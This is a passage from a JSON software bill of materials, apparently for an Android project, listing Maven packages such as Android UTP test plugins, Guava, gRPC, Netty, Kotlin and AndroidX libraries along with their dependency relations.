\"pkg:maven/com.android.tools/common@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.android.tools/annotations@31.4.0?type=jar\",\n                \"pkg:maven/com.google.guava/guava@32.0.1-jre?type=jar\",\n                \"pkg:maven/net.java.dev.jna/jna-platform@5.6.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools/annotations@31.4.0?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.guava/guava@32.0.1-jre?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.code.findbugs/jsr305@3.0.2?type=jar\",\n                \"pkg:maven/com.google.errorprone/error_prone_annotations@2.18.0?type=jar\",\n                \"pkg:maven/com.google.guava/failureaccess@1.0.1?type=jar\",\n                \"pkg:maven/com.google.guava/listenablefuture@9999.0-empty-to-avoid-conflict-with-guava?type=jar\",\n                \"pkg:maven/com.google.j2objc/j2objc-annotations@2.8?type=jar\",\n                \"pkg:maven/org.checkerframework/checker-qual@3.33.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.guava/failureaccess@1.0.1?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.guava/listenablefuture@9999.0-empty-to-avoid-conflict-with-guava?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.code.findbugs/jsr305@3.0.2?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/org.checkerframework/checker-qual@3.33.0?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.errorprone/error_prone_annotations@2.18.0?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.j2objc/j2objc-annotations@2.8?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/net.java.dev.jna/jna-platform@5.6.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/net.java.dev.jna/jna@5.6.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/net.java.dev.jna/jna@5.6.0?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk7@1.9.20?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.20?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.20?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.20?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk7@1.9.20?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\",\n                \"pkg:maven/org.jetbrains/annotations@13.0?type=jar\",\n                \"pkg:maven/org.jetbrains/annotations@23.0.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains/annotations@23.0.0?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk7@1.9.20?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.20?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.20?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.20?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.ddms/ddmlib@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.android.tools/common@31.4.0?type=jar\",\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n                \"pkg:maven/net.sf.kxml/kxml2@2.3.0?type=jar\",\n                \"pkg:maven/org.jetbrains/annotations@23.0.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/net.sf.kxml/kxml2@2.3.0?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-device-provider-ddmlib-proto@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.6.4?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core-jvm@1.6.4?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core-jvm@1.6.4?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.20?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-bom@1.6.4?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-bom@1.6.4?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core-jvm@1.6.4?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.6.4?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.testing.platform/core-proto@0.0.9-alpha02?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.testing.platform/android-device-provider-local@0.0.9-alpha02?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-device-provider-gradle@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.android.tools.utp/android-device-provider-gradle-proto@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools/common@31.4.0?type=jar\",\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n                \"pkg:maven/com.google.testing.platform/android-device-provider-local@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/com.google.testing.platform/core-proto@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains/annotations@13.0?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-device-provider-gradle-proto@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.testing.platform/android-driver-instrumentation@0.0.9-alpha02?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.testing.platform/android-test-plugin@0.0.9-alpha02?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-additional-test-output@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.android.tools.utp/android-test-plugin-host-additional-test-output-proto@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools.utp/utp-common@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools/common@31.4.0?type=jar\",\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n                \"pkg:maven/com.google.testing.platform/android-device-provider-local@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/utp-common@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.android.tools/common@31.4.0?type=jar\",\n                \"pkg:maven/com.google.testing.platform/launcher@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.testing.platform/launcher@0.0.9-alpha02?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-additional-test-output-proto@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-apk-installer@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.android.tools.utp/android-test-plugin-host-apk-installer-proto@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools/common@31.4.0?type=jar\",\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n                \"pkg:maven/com.google.testing.platform/android-device-provider-local@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/com.google.testing.platform/core-proto@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-apk-installer-proto@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-coverage@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.android.tools.utp/android-test-plugin-host-coverage-proto@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools/common@31.4.0?type=jar\",\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n                \"pkg:maven/com.google.testing.platform/android-device-provider-local@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-coverage-proto@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-device-info@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.android.tools.utp/android-test-plugin-host-device-info-proto@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools.utp/utp-common@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools/common@31.4.0?type=jar\",\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n                \"pkg:maven/com.google.testing.platform/android-device-provider-local@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-device-info-proto@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-emulator-control@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.android.tools.emulator/proto@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools.utp/android-test-plugin-host-emulator-control-proto@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools/common@31.4.0?type=jar\",\n                \"pkg:maven/com.google.code.gson/gson@2.10.1?type=jar\",\n                \"pkg:maven/com.google.crypto.tink/tink@1.7.0?type=jar\",\n                \"pkg:maven/com.google.guava/guava@32.0.1-jre?type=jar\",\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n                \"pkg:maven/com.google.testing.platform/android-device-provider-local@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/com.google.testing.platform/android-driver-instrumentation@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/commons-io/commons-io@2.13.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.6.4?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/commons-io/commons-io@2.13.0?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.code.gson/gson@2.10.1?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-emulator-control-proto@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.emulator/proto@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.code.gson/gson@2.10.1?type=jar\",\n                \"pkg:maven/com.google.guava/guava@32.0.1-jre?type=jar\",\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n                \"pkg:maven/io.grpc/grpc-core@1.57.0?type=jar\",\n                \"pkg:maven/io.grpc/grpc-netty@1.57.0?type=jar\",\n                \"pkg:maven/io.grpc/grpc-protobuf@1.57.0?type=jar\",\n                \"pkg:maven/io.grpc/grpc-stub@1.57.0?type=jar\",\n                \"pkg:maven/javax.annotation/javax.annotation-api@1.3.2?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/io.grpc/grpc-core@1.57.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.android/annotations@4.1.1.4?type=jar\",\n                \"pkg:maven/com.google.code.gson/gson@2.10.1?type=jar\",\n                \"pkg:maven/com.google.errorprone/error_prone_annotations@2.18.0?type=jar\",\n                \"pkg:maven/com.google.guava/guava@32.0.1-jre?type=jar\",\n                \"pkg:maven/io.grpc/grpc-api@1.57.0?type=jar\",\n                \"pkg:maven/io.grpc/grpc-context@1.57.0?type=jar\",\n                \"pkg:maven/io.perfmark/perfmark-api@0.26.0?type=jar\",\n                \"pkg:maven/org.codehaus.mojo/animal-sniffer-annotations@1.23?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/io.grpc/grpc-api@1.57.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.code.findbugs/jsr305@3.0.2?type=jar\",\n                \"pkg:maven/com.google.errorprone/error_prone_annotations@2.18.0?type=jar\",\n                \"pkg:maven/com.google.guava/guava@32.0.1-jre?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.android/annotations@4.1.1.4?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/org.codehaus.mojo/animal-sniffer-annotations@1.23?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/io.perfmark/perfmark-api@0.26.0?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/io.grpc/grpc-context@1.57.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/io.grpc/grpc-api@1.57.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/io.grpc/grpc-netty@1.57.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.errorprone/error_prone_annotations@2.18.0?type=jar\",\n                \"pkg:maven/com.google.guava/guava@32.0.1-jre?type=jar\",\n                \"pkg:maven/io.grpc/grpc-core@1.57.0?type=jar\",\n                \"pkg:maven/io.netty/netty-codec-http2@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-handler-proxy@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-transport-native-unix-common@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.perfmark/perfmark-api@0.26.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/io.netty/netty-codec-http2@4.1.93.Final?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/io.netty/netty-buffer@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-codec-http@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-codec@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-common@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-handler@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-transport@4.1.93.Final?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/io.netty/netty-common@4.1.93.Final?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/io.netty/netty-buffer@4.1.93.Final?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/io.netty/netty-common@4.1.93.Final?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/io.netty/netty-transport@4.1.93.Final?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/io.netty/netty-buffer@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-common@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-resolver@4.1.93.Final?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/io.netty/netty-resolver@4.1.93.Final?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/io.netty/netty-common@4.1.93.Final?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/io.netty/netty-codec@4.1.93.Final?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/io.netty/netty-buffer@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-common@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-transport@4.1.93.Final?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/io.netty/netty-handler@4.1.93.Final?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/io.netty/netty-buffer@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-codec@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-common@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-resolver@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-transport-native-unix-common@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-transport@4.1.93.Final?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/io.netty/netty-transport-native-unix-common@4.1.93.Final?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/io.netty/netty-buffer@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-common@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-transport@4.1.93.Final?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/io.netty/netty-codec-http@4.1.93.Final?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/io.netty/netty-buffer@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-codec@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-common@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-handler@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-transport@4.1.93.Final?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/io.netty/netty-handler-proxy@4.1.93.Final?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/io.netty/netty-buffer@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-codec-http@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-codec-socks@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-codec@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-common@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-transport@4.1.93.Final?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/io.netty/netty-codec-socks@4.1.93.Final?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/io.netty/netty-buffer@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-codec@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-common@4.1.93.Final?type=jar\",\n                \"pkg:maven/io.netty/netty-transport@4.1.93.Final?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/io.grpc/grpc-protobuf@1.57.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.api.grpc/proto-google-common-protos@2.17.0?type=jar\",\n                \"pkg:maven/com.google.code.findbugs/jsr305@3.0.2?type=jar\",\n                \"pkg:maven/com.google.guava/guava@32.0.1-jre?type=jar\",\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n                \"pkg:maven/io.grpc/grpc-api@1.57.0?type=jar\",\n                \"pkg:maven/io.grpc/grpc-protobuf-lite@1.57.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.api.grpc/proto-google-common-protos@2.17.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/io.grpc/grpc-protobuf-lite@1.57.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.code.findbugs/jsr305@3.0.2?type=jar\",\n                \"pkg:maven/com.google.guava/guava@32.0.1-jre?type=jar\",\n                \"pkg:maven/io.grpc/grpc-api@1.57.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/io.grpc/grpc-stub@1.57.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.errorprone/error_prone_annotations@2.18.0?type=jar\",\n                \"pkg:maven/com.google.guava/guava@32.0.1-jre?type=jar\",\n                \"pkg:maven/io.grpc/grpc-api@1.57.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/javax.annotation/javax.annotation-api@1.3.2?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.crypto.tink/tink@1.7.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.code.gson/gson@2.10.1?type=jar\",\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-logcat@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.android.tools.utp/android-test-plugin-host-logcat-proto@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools.utp/utp-common@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools/common@31.4.0?type=jar\",\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n                \"pkg:maven/com.google.testing.platform/android-device-provider-local@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-logcat-proto@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-retention@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.android.tools.emulator/proto@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools.utp/android-test-plugin-host-retention-proto@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools.utp/utp-common@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools/common@31.4.0?type=jar\",\n                \"pkg:maven/com.google.code.gson/gson@2.10.1?type=jar\",\n                \"pkg:maven/com.google.guava/guava@32.0.1-jre?type=jar\",\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n                \"pkg:maven/com.google.testing.platform/android-device-provider-local@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/commons-io/commons-io@2.13.0?type=jar\",\n                \"pkg:maven/io.grpc/grpc-core@1.57.0?type=jar\",\n                \"pkg:maven/io.grpc/grpc-netty@1.57.0?type=jar\",\n                \"pkg:maven/io.grpc/grpc-protobuf@1.57.0?type=jar\",\n                \"pkg:maven/io.grpc/grpc-stub@1.57.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.6.4?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-host-retention-proto@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-result-listener-gradle@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.android.tools.utp/android-test-plugin-result-listener-gradle-proto@31.4.0?type=jar\",\n                \"pkg:maven/com.android.tools/common@31.4.0?type=jar\",\n                \"pkg:maven/com.google.code.gson/gson@2.10.1?type=jar\",\n                \"pkg:maven/com.google.guava/guava@32.0.1-jre?type=jar\",\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n                \"pkg:maven/com.google.testing.platform/android-device-provider-local@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/com.google.testing.platform/core-proto@0.0.9-alpha02?type=jar\",\n                \"pkg:maven/io.grpc/grpc-core@1.57.0?type=jar\",\n                \"pkg:maven/io.grpc/grpc-netty@1.57.0?type=jar\",\n                \"pkg:maven/io.grpc/grpc-protobuf@1.57.0?type=jar\",\n                \"pkg:maven/io.grpc/grpc-stub@1.57.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-jdk8@1.9.20?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.6.4?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.android.tools.utp/android-test-plugin-result-listener-gradle-proto@31.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.google.code.gson/gson@2.10.1?type=jar\",\n                \"pkg:maven/com.google.guava/guava@32.0.1-jre?type=jar\",\n                \"pkg:maven/com.google.protobuf/protobuf-java@3.22.3?type=jar\",\n                \"pkg:maven/io.grpc/grpc-core@1.57.0?type=jar\",\n                \"pkg:maven/io.grpc/grpc-netty@1.57.0?type=jar\",\n                \"pkg:maven/io.grpc/grpc-protobuf@1.57.0?type=jar\",\n                \"pkg:maven/io.grpc/grpc-stub@1.57.0?type=jar\",\n                \"pkg:maven/javax.annotation/javax.annotation-api@1.3.2?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.google.testing.platform/core@0.0.9-alpha02?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.test.ext/junit@1.1.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.test/core@1.5.0?type=jar\",\n                \"pkg:maven/androidx.test/monitor@1.6.1?type=jar\",\n                \"pkg:maven/junit/junit@4.13.2?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.test.espresso/espresso-core@3.5.1?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.test.espresso/espresso-idling-resource@3.5.1?type=jar\",\n                \"pkg:maven/androidx.test/annotation@1.0.1?type=jar\",\n                \"pkg:maven/androidx.test/core@1.5.0?type=jar\",\n                \"pkg:maven/androidx.test/runner@1.5.2?type=jar\",\n                \"pkg:maven/com.google.code.findbugs/jsr305@2.0.2?type=jar\",\n                \"pkg:maven/com.squareup/javawriter@2.1.1?type=jar\",\n                \"pkg:maven/javax.inject/javax.inject@1?type=jar\",\n                \"pkg:maven/org.hamcrest/hamcrest-integration@1.3?type=jar\",\n                \"pkg:maven/org.hamcrest/hamcrest-library@1.3?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.8.22?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose/compose-bom@2024.04.00?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.animation/animation-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.animation/animation-core-android@1.6.5?type=jar\",\n                